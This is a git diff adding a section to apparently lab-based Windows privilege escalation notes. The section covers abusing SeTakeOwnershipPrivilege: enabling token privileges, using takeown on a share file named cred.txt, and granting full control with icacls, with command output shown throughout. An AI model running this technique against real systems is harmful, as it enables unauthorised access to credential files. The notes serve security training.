@@ -967,8 +967,8 @@ output
 [+] Named pipe listening...
 [+] CreateProcessAsUser() OK
 ```
----
 
+---
 # SeDebugPrivilege
 
 To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`.
@@ -1101,4 +1101,110 @@ PS C:\Tools> ImpersonateFromParentPid -ppid 636 -command cmd.exe
 [+] Updated proc attribute list
 [+] Starting cmd.exe ...True - pid: 4920 - Last error: 122
 PS C:\Tools>
+```
+
+---
+
+# SeTakeOwnershipPrivilege
+
+[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor. Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege
+
+```powershell
+PS C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                                              State
+============================= ======================================================= ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   
+```
+
+## Enabling SeTakeOwnershipPrivilege
+
+```powershell
+PS C:\htb> Import-Module .\Enable-Privilege.ps1
+PS C:\htb> .\EnableAllTokenPrivs.ps1
+PS C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                              State
+============================= ======================================== =======
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
+```
+
+## Choosing a Target File
+
+Next, choose a target file and confirm the current ownership. For our purposes, we'll target an interesting file found on a file share. It is common to encounter file shares with `Public` and `Private` directories with subdirectories set up by department. Given a user's role in the company, they can often access specific files/directories. Even with a structure like this, a sysadmin may misconfigure permissions on directories and subdirectories, making file shares a rich source of information for us once we have obtained Active Directory credentials (and sometimes even without needing credentials).
+
+```powershell
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+
+
+FullName                                 LastWriteTime         Attributes Owner
+--------                                 -------------         ---------- -----
+C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
+```
+
+We can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.
+
+```powershell
+PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'
+
+ Volume in drive C has no label.
+ Volume Serial Number is 0C92-675B
+ 
+ Directory of C:\Department Shares\Private\IT
+ 
+06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
+06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
+06/18/2021  12:23 PM                36 ...                    cred.txt
+               1 File(s)             36 bytes
+               2 Dir(s)  17,079,754,752 bytes free
+```
+
+## Taking Ownership of the File
+
+Now we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.
+
+```powershell
+PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+
+SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
+```
+
+```powershell
+PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
+ 
+Name     Directory                       Owner
+----     ---------                       -----
+cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
+```
+
+## Modifying the File ACL
+
+```powershell
+PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'
+
+cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
+At line:1 char:1
++ cat 'C:\Department Shares\Private\IT\cred.txt'
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
+   horizedAccessException
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+```
+
+Let's grant our user full privileges over the target file.
+
+```powershell
+PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+
+processed file: C:\Department Shares\Private\IT\cred.txt
+Successfully processed 1 files; Failed processing 0 files
 ```
